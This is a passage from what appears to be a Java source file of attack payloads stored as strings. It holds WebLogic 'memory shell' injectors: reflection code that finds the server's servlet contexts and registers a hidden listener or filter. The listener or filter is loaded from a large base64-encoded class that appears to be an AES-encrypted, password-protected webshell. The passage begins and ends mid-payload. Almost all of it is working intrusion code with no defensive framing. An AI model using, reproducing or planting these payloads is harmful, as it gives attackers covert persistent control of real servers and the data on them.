y9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAQbWVtc2hlbGwucGF5bG9hZAcBCAwBMwE0AQAcbWVtc2hlbGwvV2VibG9naWNGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b0J5dGVBcnJheQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAPcHJpbnRTdGFja1RyYWNlACEARQBaAAEAWwAHAAEAXABdAAAAAQBeAF8AAAAAAGAAYQAAAAEAYgBhAAAAAQBjAGEAAAAAAGQAYQAAAAEAZQBhAAAACgABAGYAZwABAGgAAACQAAMAAQAAAEYqtwABKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACSq7AApZtwALKrQAB7YADCq0AAW2AAy2AA24AA61AA8qEhC1ABGxAAAAAgBpAAAAJgAJAAAAGAAEABAACQARAA4AEgAUABMAGgAUACAAGQA/ABoARQAbAGoAAAAMAAEAAABGAGsAbAAAAAEAZgBtAAEAaAAAAJsAAwACAAAARyortwASKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACSq7AApZtwALKrQAB7YADCq0AAW2AAy2AA24AA61AA8qEhC1ABGxAAAAAgBpAAAAJgAJAAAAHwAFABAACgARAA8AEgAVABMAGwAUACEAIABAACEARgAiAGoAAAAWAAIAAABHAGsAbAAAAAAARwBuAG8AAQABAHAAcQABAGgAAAA9AAQAAgAAAAkqKwMrvrcAE7AAAAACAGkAAAAGAAEAAAAlAGoAAAAWAAIAAAAJAGsAbAAAAAAACQByAHMAAQABAHQAdQABAGgAAADYAAYABAAAACwSFLgAFU4tHJkABwSnAAQFuwAWWSq0AAW2ABcSFLcAGLYAGS0rtgAasE4BsAABAAAAKAApABsAAwBpAAAAFgAFAAAAKgAGACsAIwAsACkALQAqAC4AagAAADQABQAGACMAdgB3AAMAKgACAHgAeQADAAAALABrAGwAAAAAACwAegBzAAEAAAAsAHsAfAACAH0AAAA8AAP/AA8ABAcAfgcALwEHAH8AAQcAf/8AAAAEBwB+BwAvAQcAfwACBwB/Af8AGAADBwB+BwAvAQABBwCAAAkAZACBAAEAaAAAAKcABAADAAAAMAFMEhy4AB1NLCq2ABcDKrYAHrYAH7sAIFkELLYAIbcAIhAQtgAjtgAkTKcABE0rsAABAAIAKgAtABsAAwBpAAAAHgAHAAAAMwACADYACAA3ABUAOAAqADoALQA5AC4APABqAAAAIAADAAgAIgB7AIIAAgAAADAAegBhAAAAAgAuAIMAYQABAH0AAAATAAL/AC0AAgcAhAcAhAABBwCAAAAJAIUAhgACAGgAAAFJAAYABQAAAHgBTBIluAAmTSwSJwHAACi2ACksAcAAKrYAK04ttgAsEi0EvQAuWQMSL1O2ACktBL0AMFkDKlO2ACvAADFMpwA5ThIyuAAmTSy2ADM6BBkEtgAsEjQEvQAuWQMSL1O2ACkZBAS9ADBZAypTtgArwAAxTKcABToEK7AAAgACAD0AQAAbAEEAcQB0ABsAAwBpAAAAMgAMAAAAQAACAEQACABFABsARgA9AE4AQABHAEEASQBHAEoATQBLAHEATQB0AEwAdgBQAGoAAABIAAcAGwAiAIcAiAADAAgAOACJAIoAAgBNACQAhwCIAAQARwAtAIkAigACAEEANQCLAHkAAwAAAHgAjABzAAAAAgB2AI0AYQABAH0AAAApAAP/AEAAAgcALwcAhAABBwCA/wAzAAQHAC8HAIQABwCAAAEHAID5AAEAjgAAAAQAAQAbAAkAjwCQAAIAaAAAAVUABgAFAAAAhAFMEiW4ACZNLBI1AcAAKLYAKSwBwAAqtgArTi22ACwSNgS9AC5ZAxIxU7YAKS0EvQAwWQMqU7YAK8AAL8AAL8AAL0ynAD9OEje4ACZNLLYAMzoEGQS2ACwSOAS9AC5ZAxIxU7YAKRkEBL0AMFkDKlO2ACvAAC/AAC/AAC9MpwAFOgQrsAACAAIAQwBGABsARwB9AIAAGwADAGkAAAAyAAwAAABUAAIAWAAIAFkAGwBaAEMAYgBGAFsARwBdAE0AXgBTAF8AfQBhAIAAYACCAGQAagAAAEgABwAbACgAkQCIAAMACAA+AIkAigACAFMAKgCRAIgABABNADMAiQCKAAIARwA7AIsAeQADAAAAhACMAGEAAAACAIIAjQBzAAEAfQAAACkAA/8ARgACBwCEBwAvAAEHAID/ADkABAcAhAcALwAHAIAAAQcAgPkAAQCOAAAABAABABsAAQCSAJMAAgBoAAAANQAAAAIAAAABsQAAAAIAaQAAAAYAAQAAAGoAagAAABYAAgAAAAEAawBsAAAAAAABAJQAlQABAI4AAAAEAAEAlgABAJcAmAACAGgAAAJVAAUACAAAAVcqK8AAObUAAioswAA6tQADKrQAAhI7uQA8AgDGAPYqtAACEju5ADwCABI9tgA+Ap8A4iq0AAK5AD8BADoEKrQAAiq0AAe5AEACALgAQToFKhkFA7YAQjoFGQQSQ7kARAIAxwAiGQQSQ7sARVkqtgAstgBGtwBHGQW2AEi5AEkDAKcAjiq0AAISShkFuQBLAwC7AExZtwBNOgYZBBJDuQBEAgDAAC62ADM6BxkHGQa2AE5XGQcZBbYATlcZByq0AAK2AE5XKrQAA7kATwEAKrQADwMQELYAULYAURkHtgBSVyq0AAO5AE8BACoZBrYAUwS2AEK4AFS2AFEqtAADuQBPAQAqtAAPEBC2AFW2AFGnAD4qtAACEju5ADwCAMYAKCq0AAISO7kAPAIAEla2AD4CnwAUKrQAA7kATwEAEle2AFGnAAstKyy5AFgDAKcACjoEGQS2AFmxAAEAAAFMAU8AGwADAGkAAABmABkAAABvAAgAcAAQAHEAMgByAD0AdABPAHUAWAB2AGQAdwCDAHkAkAB6AJkAewCqAHwAsgB9ALoAfgDEAH8A2gCAAOAAgQD5AIIBDgCEATMAhQFEAIcBTACLAU8AiQFRAIoBVgCNAGoAAABcAAkAmQB1AJkAmgAGAKoAZACbAIgABwA9ANEAnACdAAQATwC/AJ4AcwAFAVEABQCfAHkABAAAAVcAawBsAAAAAAFXAKAAoQABAAABVwCiAKMAAgAAAVcApAClAAMAfQAAABYAB/0AgwcApgcAL/kAigIyB0IHAIAGAI4AAAAGAAIApwCWAAEAqABnAAEAaAAAACsAAAABAAAAAbEAAAACAGkAAAAGAAEAAACRAGoAAAAMAAEAAAABAGsAbAAAAAEAqQAAAAIAqg==\");\n" +
            "                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "            } catch (Throwable var3) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while(var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "    static {\n" +
            "        new WeblogicFilterMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String WeblogicListenerMemShell =
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "import java.util.Iterator;\n" +
            "import java.util.List;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "public class WeblogicListenerMemShell {\n" +
            "    private static String shellClassName = \"memshell.WeblogicListenerShell\";\n" +
            "\n" +
            "    public WeblogicListenerMemShell() {\n" +
            "        injectM();\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void injectM() {\n" +
            "        List var0 = getContext();\n" +
            "        Iterator var1 = var0.iterator();\n" +
            "        while(var1.hasNext()) {\n" +
            "            Object var2 = var1.next();\n" +
            "            if (isInject(var2)){break;}\n" +
            "            registerListener(var2);\n" +
            "        }\n" +
            "    }\n" +
            "    private static synchronized boolean isInject(Object obj){\n" +
            "        boolean flag = false;\n" +
            "        try{\n" +
            "            Field var6 = obj.getClass().getDeclaredField(\"eventsManager\");\n" +
            "            var6.setAccessible(true);\n" +
            "            Object var7 = var6.get(obj);\n" +
            "            Method var3 = var7.getClass().getDeclaredMethod(\"isListenerRegistered\", String.class);\n" +
            "            var3.setAccessible(true);\n" +
            "            flag = ((Boolean)var3.invoke(var7, shellClassName)).booleanValue();\n" +
            "        }catch(Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "        return flag;\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized List<Object> getContext() {\n" +
            "        ArrayList var0 = new ArrayList();\n" +
            "\n" +
            "        try {\n" +
            "            Method var1 = Thread.class.getDeclaredMethod(\"getThreads\", (Class[])null);\n" +
            "            var1.setAccessible(true);\n" +
            "            Thread[] var2 = (Thread[])((Thread[])var1.invoke((Object)null));\n" +
            "            Thread[] var3 = var2;\n" +
            "            int var4 = var2.length;\n" +
            "\n" +
            "            for(int var5 = 0; var5 < var4; ++var5) {\n" +
            "                Thread var6 = var3[var5];\n" +
            "                if (var6.getClass().getName().contains(\"weblogic.timers.internal.TimerThread\")) {\n" +
            "                    try {\n" +
            "                        Object var7 = getFV(var6, \"timerThread\");\n" +
            "\n" +
            "                        Object var12;\n" +
            "                        Object var13;\n" +
            "                        Object var15;\n" +
            "                        Object var17;\n" +
            "                        try {\n" +
            "                            Object var8 = getFV(var7, \"timerTree\");\n" +
            "                            Map var21 = (Map)var8;\n" +
            "                            Iterator var22 = var21.entrySet().iterator();\n" +
            "\n" +
            "                            while(var22.hasNext()) {\n" +
            "                                Map.Entry var23 = (Map.Entry)var22.next();\n" +
            "                                var12 = var23.getValue();\n" +
            "                                var13 = getFV(var12, \"listener\");\n" +
            "                                if (var13.getClass().getName().contains(\"SessionContext\")) {\n" +
            "                                    Field var24 = var13.getClass().getDeclaredField(\"this$0\");\n" +
            "                                    var24.setAccessible(true);\n" +
            "                                    var15 = var24.get(var13);\n" +
            "                                    Field var25 = var15.getClass().getSuperclass().getDeclaredField(\"servletContext\");\n" +
            "                                    var25.setAccessible(true);\n" +
            "                                    var17 = var25.get(var15);\n" +
            "                                    var0.add(var17);\n" +
            "                                }\n" +
            "                            }\n" +
            "                        } catch (Exception var18) {\n" +
            "                            Object var9 = getFV(var7, \"managerList\");\n" +
            "                            List var10 = (List)var9;\n" +
            "                            Iterator var11 = var10.iterator();\n" +
            "\n" +
            "                            while(var11.hasNext()) {\n" +
            "                                var12 = var11.next();\n" +
            "                                if (var12.toString().contains(\"AsyncContextTimer-ContextPath=\")) {\n" +
            "                                    var13 = getFV(var12, \"timerSet\");\n" +
            "                                    Object var14 = getFV(var13, \"timers\");\n" +
            "                                    var15 = ((List)var14).get(0);\n" +
            "                                    Object var16 = getFV(var15, \"listener\");\n" +
            "                                    var17 = getFV(var16, \"context\");\n" +
            "                                    var0.add(var17);\n" +
            "                                }\n" +
            "                            }\n" +
            "                        }\n" +
            "                    } catch (Exception var19) {\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception var20) {\n" +
            "        }\n" +
            "\n" +
            "        return var0;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void registerListener(Object var0) {\n" +
            "        try {\n" +
            "            byte[] var1 = base64Decode(\"yv66vgAAADMBWQoAYACyCQBGALMJAEYAtAgAtQkARgC2CAC3CQBGALgIALkJAEYAugcAuwoACgCyCgAKALwKAAoAvQoARgC+CQBGAL8IAMAJAEYAwQoAYADCCgBgAMMIAMQKAMUAxgcAxwoAMQDICgAWAMkKAMUAygoAxQDLBwDMCADNCgDOAM8KADEA0AoAzgDRBwDSCgDOANMKACAA1AoAIADVCgAxANYIANcKAC4A2AgA2QcA2goALgDbBwDcCgDdAN4KADAA3wgA4AcA4QcAeQcA4gcA4wgA5AoALgDlCADmCADnCADoCADpCADqCgDrAOwHAO0KAEYA7ggA7wsAOgDwCADxCgAxAPILADoA8wsAOgD0CgBGAPUKAEYA9ggA9wsA+AD5BwD6CgAuAPsKAEYAwgoARgD8CwD4AP0IAP4LADoA/QcA/woATQCyCgAwAQALAF4BAQoAMQECCgEDAQQKADAAvQoATQEFCgBGAQYKADEBBwgBCAgBCQoAGwEKCABkCgAuAQsKAQwBDQoBDAEOBwEPCABiBwEQBwERAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMbWVtc2hlbGwvV2VibG9naWNMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA+gcBEgcAzAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAOMBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHARMHAO0HAQ8HARQBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAR2YXI1AQAEdmFyOAEABHZhcjEBAAR2YXIyAQAKU291cmNlRmlsZQEAGldlYmxvZ2ljTGlzdGVuZXJTaGVsbC5qYXZhDABsAG0MAGIAYwwAZABlAQAQM2M2ZTBiOGE5YzE1MjI0YQwAZgBnAQAEcEFTMwwAaABnAQAQL2Zhdmljb25kZW1vLmljbwwAaQBnAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMARUBFgwBFwEYDABqAIcMAGoAZwEABVVURi04DABrAGcMAGwAcwwBGQEaAQADQUVTBwESDAEbARwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAEdAR4MAGwBHwwBIAEhDAEiASMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEkDAEbASUMASYBJwwBKAEpAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMASoBHgwAbAErDAEXASwMAS0BGAEAEGphdmEudXRpbC5CYXNlNjQMAS4BLwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMATABMQEAE1tMamF2YS9sYW5nL09iamVjdDsHATIMATMBNAwBNQE2AQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMATcBOAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyBwETDAE5AToBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACoAKkBABBYLVJlcXVlc3RlZC1XaXRoDAE7AIcBAA5YTUxIVFRQUmVxdWVzdAwBPAE9DAE+AT8MAUAAhwwAlQCWDAB6AHsBABBtZW1zaGVsbC5wYXlsb2FkBwEUDAFBAUIBAB5tZW1zaGVsbC9XZWJsb2dpY0xpc3RlbmVyU2hlbGwMAUMBRAwAdgB3DAFFAUYBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAUcBSAwBSQFKDAFLAUwHAU0MAU4BTwwBUAEeDACLAIwMAUsBLAEADlhtbEhUVFBSZXF1ZXN0AQAHU3VjY2VzcwwBUQBtDAFSAVMHAVQMAVUBVgwBVwFYAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b0J5dGVBcnJheQEAD3ByaW50U3RhY2tUcmFjZQEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsAIQBGAGAAAQBhAAcAAQBiAGMAAAABAGQAZQAAAAAAZgBnAAAAAQBoAGcAAAABAGkAZwAAAAAAagBnAAAAAQBrAGcAAAAKAAEAbABtAAEAbgAAAJAAAwABAAAARiq3AAEqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJKrsAClm3AAsqtAAHtgAMKrQABbYADLYADbgADrUADyoSELUAEbEAAAACAG8AAAAmAAkAAAAaAAQAEgAJABMADgAUABQAFQAaABYAIAAbAD8AHABFAB0AcAAAAAwAAQAAAEYAcQByAAAAAQBsAHMAAQBuAAAAmwADAAIAAABHKiu3ABIqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJKrsAClm3AAsqtAAHtgAMKrQABbYADLYADbgADrUADyoSELUAEbEAAAACAG8AAAAmAAkAAAAhAAUAEgAKABMADwAUABUAFQAbABYAIQAiAEAAIwBGACQAcAAAABYAAgAAAEcAcQByAAAAAABHAHQAdQABAAEAdgB3AAEAbgAAAD0ABAACAAAACSorAyu+twATsAAAAAIAbwAAAAYAAQAAACcAcAAAABYAAgAAAAkAcQByAAAAAAAJAHgAeQABAAEAegB7AAEAbgAAANgABgAEAAAALBIUuAAVTi0cmQAHBKcABAW7ABZZKrQABbYAFxIUtwAYtgAZLSu2ABqwTgGwAAEAAAAoACkAGwADAG8AAAAWAAUAAAAsAAYALQAjAC4AKQAvACoAMABwAAAANAAFAAYAIwB8AH0AAwAqAAIAfgB/AAMAAAAsAHEAcgAAAAAALACAAHkAAQAAACwAgQCCAAIAgwAAADwAA/8ADwAEBwCEBwAvAQcAhQABBwCF/wAAAAQHAIQHAC8BBwCFAAIHAIUB/wAYAAMHAIQHAC8BAAEHAIYACQBqAIcAAQBuAAAApwAEAAMAAAAwAUwSHLgAHU0sKrYAFwMqtgAetgAfuwAgWQQstgAhtwAiEBC2ACO2ACRMpwAETSuwAAEAAgAqAC0AGwADAG8AAAAeAAcAAAA1AAIAOAAIADkAFQA6ACoAPAAtADsALgA+AHAAAAAgAAMACAAiAIEAiAACAAAAMACAA